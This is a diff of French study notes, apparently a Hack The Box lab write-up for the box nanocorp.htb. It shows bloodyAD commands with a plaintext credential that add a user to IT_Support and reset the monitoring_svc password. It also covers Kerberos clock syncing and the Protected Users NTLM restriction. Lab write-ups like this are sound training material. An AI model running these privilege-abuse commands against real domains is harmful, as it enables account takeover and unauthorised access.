@@ -206,7 +206,7 @@ Résultat : accès refusé → pas membre de *Remote Management Users*.
 
 ![[IMG-20251114170414692.png]]
 
-![[IMG-20251114170505871.png]]
+
 
 
 ### Analyse
@@ -221,12 +221,17 @@ Résultat : accès refusé → pas membre de *Remote Management Users*.
 Une escalade AD classique n'est pas possible.\
 Il faudra exploiter un **service**, une **application**, ou
 **monitoring_svc**.
+
+
+![[Pasted image 20251115191310.png]]
+
 ```
 [Nov 14, 2025 - 19:26:16 (CET)] exegol-htb-vpn /workspace # bloodyAD --host 10.10.11.93 -u WEB_SVC -p 'dksehdgh712!@#' -d nanocorp.htb add groupMember "IT_Support" "WEB_SVC"
 
 [+] WEB_SVC added to IT_Support
 ```
 
+![[Pasted image 20251115191445.png]]
 
 ```
 [Nov 14, 2025 - 19:07:38 (CET)] exegol-htb-vpn /workspace # bloodyAD --host 10.10.11.93 -u WEB_SVC -p 'dksehdgh712!@#' -d nanocorp.htb set password "monitoring_svc" "Password1234"
@@ -238,22 +243,58 @@ Il faudra exploiter un **service**, une **application**, ou
 Vérification du mdp
 ![[IMG-20251115125838454.png]]
 
-Questions:
+Interface exegol pour set les infos de la boxe
 
-Comment tu sais que t as les droitsd d ajouter ton user au groupe IT_Support
-
-ADMR a quoi ça sert?
-
-Comment vérifier que ton mdp est bien changé?
-
-estce ce que ces commandes sont bonnes:
-[Nov 14, 2025 - 19:40:21 (CET)] exegol-htb-vpn /workspace # bloodyAD --host 10.10.11.93 -u WEB_SVC -p 'dksehdgh712!@#' -d nanocorp.htb add groupMember "IT_Support" "WEB_SVC"
-[+] WEB_SVC added to IT_Support
-[Nov 14, 2025 - 19:41:20 (CET)] exegol-htb-vpn /workspace # bloodyAD --host 10.10.11.93 -u WEB_SVC -p 'dksehdgh712!@#' -d nanocorp.htb set password "monitoring_svc" "Test1234"
-[+] Password changed successfully!
-[Nov 14, 2025 - 19:41:28 (CET)] exegol-htb-vpn /workspace # 
-
- bloodhound fonctionne que lorsqu on a des acces sur l annulaire ldap?
  ```
  exh set creds
  ```
+
+
+![[Pasted image 20251115191216.png]]
+
+
+![[IMG-20251115191105997.png]]
+
+[Protected Users Security Group](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn466518(v=ws.11)?redirectedfrom=MSDN)
+
+![[Pasted image 20251115192005.png]]
+
+![[Pasted image 20251115192040.png]]
+=  connexions sécurisées via HTTPS
+
+![[Pasted image 20251115192201.png]]
+
+```
+sudo apt update
+sudo apt install ntpdate
+faketime "$(ntpdate -q $DC_HOST | grep -oP '\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}')" zsh
+```
+
+[Tools winrmexec](https://github.com/ozelis/winrmexec)
+
+![[Pasted image 20251115191755.png]]
+
+## **`-k` → Kerberos authentication**
+
+Ce flag force **l’utilisation de Kerberos**, pas NTLM.
+
+Pourquoi c’est OBLIGATOIRE pour monitoring_svc ?
+
+### ✔ Parce que **monitoring_svc ∈ Protected Users**
+
+Protected Users **interdit NTLM**.  
+Donc tout ce qui utilise NTLM → bloqué :
+
+- evil-winrm classiqu
+- wmiexec
+- smbexec
+- psexec
+- NetExec SMB, WMI, WinRM sans Kerberos
+Donc tu DOIS utiliser Kerberos.
+
+
+
+![[Pasted image 20251115191854.png]]
+
+![[Pasted image 20251115191909.png]]
+
